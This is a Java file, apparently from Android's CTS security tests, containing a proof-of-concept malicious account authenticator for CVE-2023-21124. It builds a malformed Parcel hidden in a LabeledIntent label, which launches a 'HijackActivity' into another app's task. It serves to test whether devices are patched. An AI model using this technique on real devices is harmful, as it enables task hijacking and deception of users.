/*
 * Copyright (C) 2023 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_21124_test;

import static com.google.common.truth.TruthJUnit.assume;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.ActivityOptions;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.LabeledIntent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.text.SpannableString;
import android.text.style.URLSpan;

import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;

public class PocAuthService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return new TestAccountAuthenticator(this).getIBinder();
    }

    class TestAccountAuthenticator extends AbstractAccountAuthenticator {

        public TestAccountAuthenticator(Context context) {
            super(context);
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return null;
        }

        @Override
        public Bundle addAccount(
                AccountAuthenticatorResponse response,
                String accountType,
                String authTokenType,
                String[] requiredFeatures,
                Bundle options)
                throws NetworkErrorException {
            try {
                // Fetch taskId of 'TargetActivity' through SharedPreference
                int taskIdOfTargetActivity =
                        getSharedPreferences(
                                        getString(R.string.sharedPreferences), Context.MODE_PRIVATE)
                                .getInt(getString(R.string.taskIdOfTargetActivity), -1);
                assume().withMessage("Did not find the taskId of 'TargetActivity'")
                        .that(taskIdOfTargetActivity)
                        .isNotEqualTo(-1);

                // Create a bundle and put taskId of 'TargetActivity' into it
                Bundle evilOptions = new Bundle();
                evilOptions.putInt(
                        (String)
                                setAccessibleFor(ActivityOptions.class, "KEY_LAUNCH_TASK_ID")
                                        .get(null),
                        taskIdOfTargetActivity);

                // Create parcel to reproduce vulnerability
                Parcel optionPayload = Parcel.obtain();
                evilOptions.writeToParcel(optionPayload, 0 /* flags */);
                optionPayload.setDataPosition(0 /* pos */);
                int originLen = optionPayload.readInt();
                optionPayload.setDataPosition(0 /* pos */);
                optionPayload.writeInt(2 * originLen /* val */);

                // Create parcel to reproduce vulnerability
                Parcel payload = Parcel.obtain();
                payload.writeString("" /* val */);
                payload.writeInt(0 /* val */);
                payload.writeInt(0 /* val */);
                payload.writeTypedObject(null /* val */, 0 /* parcelableFlags */);
                payload.writeInt(1 /* val */);
                payload.appendFrom(optionPayload, 0 /* offset */, optionPayload.dataSize());

                // Create an object of 'LabeledIntent' to set intent to launch 'HijackActivity'
                LabeledIntent labeledIntent =
                        new LabeledIntent(
                                new Intent(getApplicationContext(), HijackActivity.class),
                                null /* sourcePackage */,
                                1 /* labelRes */,
                                0 /* icon */);

                // Create a 'SpannableString' to set value of 'mNonLocalizedLabel'
                // of 'LabeledIntent'
                SpannableString spannableString = new SpannableString("");
                spannableString.setSpan(
                        new URLSpan(new String(payload.marshall(), StandardCharsets.UTF_16LE)),
                        0 /* start */,
                        0 /* end */,
                        0 /* flags */);

                // Set the value of private field 'mNonLocalizedLabel'
                Field field = setAccessibleFor(LabeledIntent.class, "mNonLocalizedLabel");
                field.set(labeledIntent, spannableString);

                // Return the bundle with labeledIntent
                Bundle result = new Bundle();
                result.putParcelable(AccountManager.KEY_INTENT, labeledIntent);
                return result;
            } catch (Exception ignore) {
                // Ignore
            }
            return null;
        }

        private Field setAccessibleFor(Class<?> clazz, String fieldName) {
            for (Field field : clazz.getDeclaredFields()) {
                if (field.getName().contentEquals(fieldName)) {
                    field.setAccessible(true);
                    return field;
                }
            }
            return null;
        }

        @Override
        public Bundle confirmCredentials(
                AccountAuthenticatorResponse response, Account account, Bundle options)
                throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle getAuthToken(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return null;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle hasFeatures(
                AccountAuthenticatorResponse response, Account account, String[] features)
                throws NetworkErrorException {
            return null;
        }
    }
}
